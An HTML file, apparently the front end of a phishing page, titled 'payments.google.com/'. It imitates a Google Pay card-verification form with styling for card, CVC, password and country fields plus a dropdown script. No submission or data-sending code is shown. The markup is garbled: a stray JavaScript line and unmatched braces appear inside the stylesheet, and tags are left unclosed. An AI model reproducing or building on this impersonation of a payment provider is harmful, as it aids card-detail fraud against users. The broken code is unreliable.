<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>payments.google.com/</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Prevent body scroll */
        }

        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0px 2px 12px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            max-height: 80vh; /* Set a maximum height */
            padding: 20px;
            overflow-y: auto; /* Enable vertical scroll if content exceeds */
        }

        .container h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
            font-weight: normal;
        }

        .input-container {
            position: relative;
            margin-bottom: 24px;
        }

        .input-container input[type="text"], 
        .input-container input[type="number"],
        .input-container input[type="password"] {
            width: 100%;
            height: 48px;
            padding: 12px;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-bottom 0.3s ease-in-out;
        }

        .input-container input:focus {
            border-bottom: 2px solid #1a73e8;
        }

        .input-container label {
            position: absolute;
            top: 16px;
            left: 12px;
            font-size: 16px;
            color: #999;
            pointer-events: none;
            transition: 0.3s ease all;
            
        }

        .input-container input:focus + label,
        .input-container input:not(:placeholder-shown) + label {
            top: -10px;
            left: 8px;
            font-size: 12px;
            color: #1a73e8;
        }

        input[type="submit"] {
            width: 100%;
            height: 48px;
            background-color: #1a73e8;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 16px;
            transition: background-color 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #1669c2;
        }

        .gpay-logo {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .gpay-logo img {
            width: 120px;
        }

        .two-col {
            display: flex;
            justify-content: space-between;
            margin: 8px 0;
        }

        .two-col div {
            flex: 1;
            margin-right: 10px;
        }

        .two-col div:last-child {
            margin-right: 0;
        }

        .dropdown {
            position: relative;
            margin: 8px 0;
        }

        .dropbtn {
            width: 100%;
            height: 48px;
            background-color: transparent;
            border: none;
            border-bottom: 2px solid #ccc;
            padding: 12px;
            font-size: 16px;
            text-align: left;
            cursor: pointer;
            outline: none;
            transition: border-bottom 0.3s ease-in-out;
            display: flex;
            align-items: center;
        }

        .dropbtn img {
            margin-right: 10px;
            width: 20px;
        }

        .dropdown-content {
            display: none;
            position: absolute;
            background-color: #f9f9f9;
            width: 100%;
            box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
            z-index: 1;
        }

        .dropdown-content .country-option {
            padding: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .dropdown-content .country-option:hover {
            background-color: #f1f1f1;
        }

        .country-option img {
            width: 20px;
            margin-right: 8px;
        }

        .credit-card-verification {
            background-color: #dde8f7; /* Light blue background */
            border-left: 5px solid #0259b5; /* Dark blue left line */
            padding: 15px; /* Padding for the box */
            border-radius: 5px; /* Slightly rounded corners */
            color: #646262; /* White text color */
            max-width: 600px; /* Maximum width of the box */
            margin: 20px auto; /* Center the box */
        }

        .credit-card-verification h3 {
            margin: 0; /* Remove default margin */
            font-size: 14px; /* Adjust font size as needed */
            font-weight: normal; /* Set font weight to normal */
        }
        .expiry-separator {
            margin: 25px 10px; /* Add some margin for spacing */
            font-size: 16px; /* Adjust font size if needed */
            color: #999; /* Change color to match your design */
            vertical-align: middle; /* Align the separator vertically */
        }

        .cvc-container {
            display: flex; /* Use flexbox for layout */
            align-items: center; /* Center items vertically */
        }

        .cvc-image {
            width: 20px; /* Adjust the width of the image as needed */
            height: auto; /* Maintain aspect ratio */
            margin-left: 100px; /* Spacing between input and image */
            position: relative; /* Allow positioning adjustments */
            top: -30px; /* Move the image slightly up */
        }

        .caret {
            display: inline-block;
            width: 0;
            height: 0;
            margin-left: 230px; /* Space between text and triangle */
            border-left: 5px solid transparent; /* Left side of the triangle */
            border-right: 5px solid transparent; /* Right side of the triangle */
            border-top: 5px solid #626161; /* Color of the triangle */
            vertical-align: middle; /* Align the triangle vertically with the text */
        }

        option.setAttribute('data-value', code);

    }
}

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const dropdownBtn = document.querySelector('.dropbtn');
            const dropdownContent = document.querySelector('.dropdown-content');
            const countryOptions = document.querySelectorAll('.country-option');
            const flagImg = dropdownBtn.querySelector('img');

            countryOptions.forEach(option => {
                option.addEventListener('click', function() {
                    const selectedCountry = option.textContent.trim();
                    const selectedFlag = option.querySelector('img').src;
                    
                    // Update the button with the selected country's flag and name
                    dropdownBtn.innerHTML = `<img src="${selectedFlag}" alt="Flag"> ${selectedCountry}`;
                    
                    // Close the dropdown
                    dropdownContent.style.display = 'none';
                });
            });

            // Toggle dropdown visibility on button click
            dropdownBtn.addEventListener('click', function() {
                dropdownContent.style.display = dropdownContent.style.display === 'block' ? 'none' : 'block';
            });

            // Hide dropdown if clicked outside
            document.addEventListener('click', function(event) {
                if (!event.target.closest('.dropdown')) {
                    dropdownContent.style.display = 'none';
                }
            });
        });
